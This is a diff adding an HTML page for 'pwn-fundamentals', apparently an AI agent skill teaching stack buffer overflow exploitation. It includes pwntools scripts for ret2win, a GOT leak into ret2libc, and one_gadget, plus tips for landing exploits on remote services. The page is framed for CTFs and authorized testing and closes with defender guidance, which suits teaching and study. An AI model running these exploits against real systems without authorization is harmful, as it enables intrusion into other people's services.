@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: pwn-fundamentals</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>pwn-fundamentals</h2><div class="meta"><span class="badge gray">binary</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to exploit a classic stack buffer overflow on</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ghidra-basics.html">ghidra-basics</a> <a href="shellcode-basics.html">shellcode-basics</a> <a href="format-strings.html">format-strings</a> <a href="rop-chains.html">rop-chains</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>pwntools</td><td>4.13</td></tr><tr><td>GDB</td><td>15.x</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>gcc</td><td>14.x</td></tr></tbody></table><p>Binary exploitation starts with the stack buffer overflow: a program reads more input than its buffer holds, overwrites the saved return address, and hands control of execution to the attacker. This skill teaches the full authorized workflow for that classic bug class, from triage through a working ret2libc exploit, using pwntools and GDB. Deeper techniques have their own skills: ROP chains (rop-chains), handwritten shellcode (shellcode-basics), format string bugs (format-strings), and heap bugs (heap-exploitation). All exploitation targets binaries you have written permission to test, such as CTF challenges, lab VMs, or client software in scope.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Triage the binary: architecture, protections (checksec), and the input</li>
+<p>path that overflows.</p>
+<li>Find the exact offset from input start to the saved return address with</li>
+<p>a cyclic pattern.</p>
+<li>Confirm control of the instruction pointer by crashing with the pattern</li>
+<p>and reading the fault address.</p>
+<li>If a win function exists (calls system with /bin/sh), overwrite the</li>
+<p>return address with its address.</p>
+<li>If not, leak a libc address at runtime to defeat ASLR, compute libc</li>
+<p>base, and return into system.</p>
+<li>Stabilize the exploit: handle bad characters, alignment, and remote</li>
+<p>vs local differences.</p>
+<li>Verify the exploit works repeatedly and against the remote service,</li>
+<p>not just locally.</p>
+</ol>
+<h2>1. Triage the binary</h2>
+<pre><code class="language-bash"># Protections: NX, PIE, canary, RELRO decide the exploit strategy
+checksec --file=./vuln
+
+# Example output to read:
+# Arch: amd64, RELRO: Partial, Stack: No canary, NX: Enabled, PIE: No PIE</code></pre>
+<p>Read the output like a plan:</p>
+<ul>
+<li>No canary: you can overwrite the saved return address directly.</li>
+<li>No PIE: binary addresses are fixed, gadgets and win functions are at</li>
+<p>known addresses.</p>
+<li>NX enabled: the stack is not executable, so you must reuse existing</li>
+<p>code (ret2libc) instead of running injected shellcode.</p>
+<li>Partial RELRO: the GOT is writable, useful for format string or GOT</li>
+<p>overwrite follow-ups.</p>
+</ul>
+<p>Find the vulnerable input path. Use the ghidra-basics skill or a quick strings pass to locate <code>gets</code>, <code>strcpy</code>, <code>scanf</code>, or <code>read</code> into a small stack buffer.</p>
+<pre><code class="language-bash"># Build a practice binary with protections off to learn the basics
+gcc -fno-stack-protector -no-pie -o vuln_practice vuln.c
+checksec --file=./vuln_practice</code></pre>
+<h2>2. Find the offset with a cyclic pattern</h2>
+<p>pwntools generates a unique pattern where every 4 or 8 byte substring is distinct, so the crash address tells you the exact offset.</p>
+<pre><code class="language-bash"># Generate a 200 byte pattern and feed it to the binary
+python3 -c &quot;from pwn import *; print(cyclic(200).decode())&quot; &gt; /tmp/pattern.txt
+./vuln &lt; /tmp/pattern.txt
+# The program crashes; note the fault address from the segfault message
+# or from GDB: info registers rip</code></pre>
+<pre><code class="language-bash"># In GDB, run with the pattern and read the crash address
+gdb -q ./vuln
+# (gdb) run &lt; /tmp/pattern.txt
+# Program received signal SIGSEGV ... rip 0x6161616c6261616b ...
+# (gdb) quit
+
+# Convert the fault address back to an offset
+python3 -c &quot;from pwn import *; print(cyclic_find(0x6161616c6261616b))&quot;
+# Output example: 72</code></pre>
+<p>On 64-bit, the fault address in RIP is 8 bytes of the pattern. Copy it exactly, including endianness as shown. If the program crashes reading input rather than returning, the offset is to a different register; check which register holds pattern bytes and adjust.</p>
+<p>A faster loop that does this automatically:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+p = process(&#x27;./vuln&#x27;)
+p.sendline(cyclic(200))
+p.wait()
+core = p.corefile
+offset = cyclic_find(core.read(core.rsp, 8))
+print(&quot;offset:&quot;, offset)</code></pre>
+<h2>3. Hijack control flow to a win function</h2>
+<p>The simplest exploit: the binary has a function that spawns a shell, and you overwrite the return address with its address.</p>
+<pre><code class="language-bash"># Find the win function address (no PIE, so it is fixed)
+nm ./vuln | grep -i win
+# or: objdump -d ./vuln | grep -A2 &#x27;&lt;win&gt;&#x27;</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./vuln&#x27;)
+OFFSET = 72  # from the cyclic pattern step
+WIN = exe.symbols[&#x27;win&#x27;]  # address of the win function
+
+p = process(&#x27;./vuln&#x27;)
+payload = b&#x27;A&#x27; * OFFSET
+payload += p64(WIN)
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>If <code>win</code> takes no arguments and just calls <code>system(&quot;/bin/sh&quot;)</code>, this is enough. Test locally first, then point the same script at the remote service by replacing <code>process</code> with <code>remote(&#x27;host&#x27;, port)</code>.</p>
+<p>Stack alignment matters on 64-bit: if the exploit crashes inside <code>system</code> with a <code>movaps</code> fault, add a single <code>ret</code> gadget before the win address to fix 16-byte alignment.</p>
+<pre><code class="language-python">rop = ROP(exe)
+payload += p64(rop.find_gadget([&#x27;ret&#x27;])[0])
+payload += p64(WIN)</code></pre>
+<h2>4. Leak an address to defeat ASLR</h2>
+<p>When the binary has no win function and ASLR randomizes libc, leak a real libc address at runtime, compute the libc base, then call system.</p>
+<p>The classic leak uses the PLT: call <code>puts</code> on a GOT entry, which prints the resolved libc address of that function.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./vuln&#x27;)
+libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)  # match the REMOTE libc
+OFFSET = 72
+
+rop = ROP(exe)
+# Build: puts(puts@got) then return to main for a second stage
+payload = b&#x27;A&#x27; * OFFSET
+payload += p64(rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0])
+payload += p64(exe.got[&#x27;puts&#x27;])
+payload += p64(exe.plt[&#x27;puts&#x27;])
+payload += p64(exe.symbols[&#x27;main&#x27;])
+
+p = process(&#x27;./vuln&#x27;)
+p.sendline(payload)
+p.recvline()  # consume any prompt output
+leak = u64(p.recvline().strip().ljust(8, b&#x27;\x00&#x27;))
+print(&quot;puts leak:&quot;, hex(leak))
+
+libc.address = leak - libc.symbols[&#x27;puts&#x27;]
+print(&quot;libc base:&quot;, hex(libc.address))</code></pre>
+<p>Then the second stage calls <code>system(&quot;/bin/sh&quot;)</code>:</p>
+<pre><code class="language-python">payload2 = b&#x27;A&#x27; * OFFSET
+payload2 += p64(rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0])
+payload2 += p64(next(libc.search(b&#x27;/bin/sh&#x27;)))
+payload2 += p64(rop.find_gadget([&#x27;ret&#x27;])[0])  # stack alignment
+payload2 += p64(libc.symbols[&#x27;system&#x27;])
+p.sendline(payload2)
+p.interactive()</code></pre>
+<p>Critical detail: the libc on your machine is almost never the remote libc. Download the remote libc (CTF platforms provide it) and use that file for offset math, or the computed <code>system</code> address will be wrong.</p>
+<h2>5. one_gadget shortcut</h2>
+<p>When conditions allow, a single address in libc spawns a shell with no argument setup. The one_gadget tool finds these addresses and their constraints (for example, specific registers must be zero).</p>
+<pre><code class="language-bash"># Find one_gadgets in the target libc
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+# Output: 0xebc81 execve(&quot;/bin/sh&quot;, rbp-0x50, ...) with constraints [...]</code></pre>
+<pre><code class="language-python"># Replace the system call with the gadget address
+ONE_GADGET = 0xebc81
+payload2 = b&#x27;A&#x27; * OFFSET
+payload2 += p64(libc.address + ONE_GADGET)
+p.sendline(payload2)
+p.interactive()</code></pre>
+<p>Check the constraints in GDB before relying on a gadget: break at the gadget address, inspect the required registers, and pick a gadget whose constraints your exploit state satisfies. The first gadget in the list is not always the usable one.</p>
+<h2>6. Stabilize for remote</h2>
+<p>Local success does not guarantee remote success. Common gaps:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./vuln&#x27;)
+libc = ELF(&#x27;./libc.so.6&#x27;)  # the REMOTE libc file
+context.binary = exe
+
+# Test locally, then flip one line for remote
+p = process(&#x27;./vuln&#x27;)
+# p = remote(&#x27;challenge.example&#x27;, 1337)
+
+# Always consume the prompt before sending the payload
+p.recvuntil(b&#x27;input: &#x27;)
+# ...</code></pre>
+<p>Rules for remote reliability:</p>
+<ul>
+<li>Match the remote libc exactly. Even a patch-level difference shifts</li>
+<p>offsets.</p>
+<li>Handle timing: add <code>p.recvuntil()</code> for every prompt, and use generous</li>
+<p>timeouts on slow networks.</p>
+<li>Check for bad characters: if the input goes through <code>strcpy</code>, a</li>
+<p><code>\x00</code> byte truncates your payload. Test each address for null bytes and pick alternatives.</p>
+<li>Run the exploit in a loop (10 tries) during development. If it</li>
+<p>works 3 out of 10, something is uninitialized or racy; investigate before calling it done.</p>
+</ul>
+<h2>Edge cases</h2>
+<ul>
+<li>A stack canary is present. The classic overflow dies at the canary</li>
+<p>check. You need a leak of the canary value first (format string bug is the usual partner) or a different bug class entirely.</p>
+<li>PIE is enabled. Binary addresses randomize, so hardcoded win</li>
+<p>function addresses fail. Leak a binary address first (same puts technique on a binary GOT entry, or a format string leak), compute the binary base, then proceed.</p>
+<li>Full RELRO plus no useful PLT entries. The puts leak still works</li>
+<p>because it only reads the GOT; it does not write it.</p>
+<li>The input function is <code>fgets</code> with a size limit smaller than your</li>
+<p>payload. You cannot overflow in one write; look for multiple reads, a second input path, or an integer bug in the size calculation.</p>
+<li>The crash offset differs between local and remote. Different</li>
+<p>compiler versions or environment variables shift the stack. Do the cyclic offset discovery against the remote service if it echoes crashes, or make the offset a variable you tune per target.</p>
+<li><code>system</code> is not in the binary&#x27;s imports and libc has no <code>/bin/sh</code></li>
+<p>string in the expected place. Search the provided libc for the string, and if truly absent, use <code>execve</code> via ROP (see rop-chains) or a one_gadget.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No win function and no PLT leak primitive: use a format string</li>
+<p>vulnerability to leak addresses (format-strings skill), or pivot to ROP with gadgets from the binary itself (rop-chains skill).</p>
+<li>The overflow is on the heap, not the stack: this skill does not</li>
+<p>apply. Switch to heap-exploitation.</p>
+<li>NX is disabled (rare on modern systems): you can jump to shellcode</li>
+<p>on the stack. See shellcode-basics for building it, and remember this almost never happens on current distributions.</p>
+<li>The service forks per connection: brute-forcing a canary byte by</li>
+<p>byte becomes possible since only the child crashes. This is slow but reliable on forking network services.</p>
+<li>Everything fails and the binary is small: re-examine it in Ghidra.</li>
+<p>Many CTF binaries hide a second vulnerability (an integer overflow on the read size, a use-after-free) that is easier than fighting the stack protections.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders detect exploitation attempts through crash monitoring (repeated SIGSEGV from one source), IDS signatures for long non-printable input, and canary or fortify failures in application logs. The durable fixes are compiling with stack canaries, PIE, and NX (all on by default in modern toolchains), replacing unsafe input functions (<code>gets</code>, unbounded <code>strcpy</code>) with bounded versions, and fuzzing the input parsers before release. For incident responders, a crash loop against a network service followed by a successful connection is the signature of an exploit being developed and then landing.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-121 (Stack-based Buffer Overflow).</li>
+<li>CWE-122 (Heap-based Buffer Overflow): the sibling class, covered in</li>
+<p>heap-exploitation.</p>
+<li>CWE-787 (Out-of-bounds Write): the modern parent category.</li>
+<li>CWE-120 (Buffer Copy without Checking Size of Input).</li>
+<li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation): when the</li>
+<p>target is a setuid binary.</p>
+<li>pwntools documentation: https://docs.pwntools.com/</li>
+<li>GDB documentation: https://sourceware.org/gdb/documentation/</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
